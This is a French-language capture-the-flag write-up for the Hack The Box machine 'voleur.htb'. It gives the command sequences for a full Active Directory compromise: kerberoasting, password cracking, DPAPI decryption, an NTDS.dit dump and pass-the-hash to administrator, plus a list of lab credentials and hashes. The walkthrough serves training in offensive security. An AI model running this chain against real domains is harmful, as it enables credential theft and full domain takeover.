# TARGET: voleur.htb

**IP:** `10.10.11.76`
**Domain:** `voleur.htb`
**DC:** `dc.voleur.htb`

---

## Résumé

Engagement Active Directory. Accès initial via Kerberos TGT pour `ryan.naylor`. SMB enumeration et extraction d'un fichier Excel chiffré contenant des credentials. Cracking et utilisation des comptes pour kerberoast ciblé, WinRM et récupération de clés DPAPI. Découverte d'une clé SSH et accès à `svc_backup` via WSL. Extraction du AD database (ntds.dit) et dump des NTLM permettant compromission de `administrator`.

---

## 1) Configuration Kerberos

`/etc/krb5.conf` utilisé :

```ini
[libdefaults]
  default_realm = VOLEUR.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  VOLEUR.HTB = {
    kdc = dc.voleur.htb
  }

[domain_realm]
  .voleur.htb = VOLEUR.HTB
  voleur.htb   = VOLEUR.HTB
```

---

## 2) Obtention du TGT initial (ryan.naylor)

```bash
getTGT.py -dc-ip 10.10.11.76 'voleur.htb/ryan.naylor:HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
```

---

## 3) SMB enumeration avec Kerberos

```bash
netexec smb DC.VOLEUR.HTB -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
netexec smb enum DC.VOLEUR.HTB --use-kcache --share IT --dir ""
netexec smb enum DC.VOLEUR.HTB --use-kcache --share IT --dir "First-Line Support"
```

Téléchargement du fichier Excel chiffré:

```bash
netexec smb DC.VOLEUR.HTB --use-kcache --get-file "First-Line Support/Access_Review.xlsx" "./Access_Review.xlsx" --share IT
```

---

## 4) Cracking du mot de passe du fichier Excel

```bash
office2john Access_Review.xlsx > xlsx.h
john xlsx.h --wordlist=/usr/share/wordlists/rockyou.txt
```

**Résultat:** `football1`

Décryptage et extraction:

```bash
msoffcrypto-tool -p "football1" Access_Review.xlsx decrypted.xlsx
xlsx2csv decrypted.xlsx | sed -n '5p;12p;13p'
```

Credentials extraits (exemples):

```
Todd.Wolfe - Password was reset to NightT1meP1dg3on14 and account deleted
svc_ldap - P/W - M1XyC9pW7qT5Vn
svc_iis - P/W - N5pXyW1VqM7CZ8
```

---

## 5) Kerberoast ciblé

Utiliser `svc_ldap` pour demander des tickets pour `svc_winrm`:

```bash
getTGT.py -dc-ip 10.10.11.76 'voleur.htb/svc_ldap:M1XyC9pW7qT5Vn'
export KRB5CCNAME=svc_ldap.ccache
targetedKerberoast.py -v --dc-ip 10.10.11.76 --dc-host dc.VOLEUR.HTB -d "voleur.htb" -u "svc_ldap" -k --request-user svc_winrm -o kerberostable.txt
```

Extrait un TGS hash (format krb5tgs...).

Crack avec John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs kerberostable.txt
```

**Résultat:** `svc_winrm:AFireInsidedeOzarctica980219afi`

---

## 6) Accès WinRM avec svc_winrm

```bash
getTGT.py -dc-ip 10.10.11.76 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
export KRB5CCNAME=FILE:svc_winrm.ccache
evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB
```

---

## 7) Restauration du compte Todd.Wolfe (comptes supprimés)

```powershell
$cred = [PSCredential]::new("svc_ldap@voleur.htb", (ConvertTo-SecureString "M1XyC9pW7qT5Vn" -AsPlainText -Force))
Import-Module ActiveDirectory
Get-ADObject -Filter {sAMAccountName -eq "todd.wolfe"} -IncludeDeletedObjects -Credential $cred | Restore-ADObject -Credential $cred
Get-ADUser todd.wolfe
```

---

## 8) Accès SMB avec Todd.Wolfe

```bash
getTGT.py -dc-ip 10.10.11.76 'voleur.htb/todd.wolfe:NightT1meP1dg3on14'
KRB5CCNAME=todd.wolfe.ccache smbclient.py -k -no-pass VOLEUR.HTB/todd.wolfe@dc.voleur.htb

# naviguer:
use IT
cd "Second-Line Support"
cd "Archived Users"
cd todd.wolfe
```

---

## 9) DPAPI — extraction de credentials

Trouvé dans `AppData/Roaming/Microsoft/`.

Récupération du masterkey et décryptage:

```bash
# extraire masterkey
dpapi.py masterkey -file "protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88" -sid "S-1-5-21-3927696377-1337352550-2781715495-1110" -password "NightT1meP1dg3on14"

# résultat masterkey
# 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

# déchiffrer credential
dpapi.py credential -file "credentials/772275FAD58525253490A9B0039791D3" -key 0xd283...650a83
```

**Résultat DPAPI:** `Username: jeremy.combs Password: qT3V9pLXyN7W4m`

---

## 10) Accès avec Jeremy.Combs

```bash
getTGT.py -dc-ip 10.10.11.76 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m'
export KRB5CCNAME=FILE:jeremy.combs.ccache

# evil-winrm (fonctionne mais peu utile)
evil-winrm -i dc.voleur.htb -k -u jeremy.combs -r VOLEUR.HTB

# SMB avec Kerberos
auth via smbclient.py -k -no-pass VOLEUR.HTB/jeremy.combs@dc.voleur.htb
```

---

## 11) Clé SSH trouvée

Fichier `id_rsa` trouvé dans SMB share. Contenu format OpenSSH private key. Exemple d'utilisation via WSL:

```bash
chmod 400 id_rsa
ssh -p 2222 -i id_rsa svc_backup@voleur.htb
```

---

## 12) Accès svc_backup via WSL

SSH vers `svc_backup` sur port `2222` en utilisant `id_rsa`.

---

## 13) Extraction AD database (NTDS)

Fichiers trouvés sous `/mnt/c/IT/THIRD-LINE SUPPORT/` :

```
./Active Directory: ntds.dit ntds.jfm
./registry: SECURITY SYSTEM
```

Dump des NTLM:

```bash
secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL
```

**Hash administrateur extrait:**

```
administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

---

## 14) Passage au compte Administrator

```bash
getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator
export KRB5CCNAME=FILE:administrator.ccache
evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB
```

---

## 15) Récapitulatif des credentials

```
ryan.naylor:HollowOct31Nyt (Initial access)
Todd.Wolfe:NightT1meP1dg3on14 (Restored account)
svc_ldap:M1XyC9pW7qT5Vn (Excel file)
svc_iis:N5pXyW1VqM7CZ8 (Excel file)
svc_winrm:AFireInsidedeOzarctica980219afi (Kerberoasted)
jeremy.combs:qT3V9pLXyN7W4m (DPAPI)
administrator:e656e07c56d831611b577b160b259ad2 (NTDS dump)
```

---

## Remarques

* Toutes les actions supposent un cadre légal et des autorisations appropriées (lab, HTB).
* Conserver preuves et logs.
* Certains outils demandent des versions spécifiques et les opérations Kerberos requièrent des configurations locales correctes.

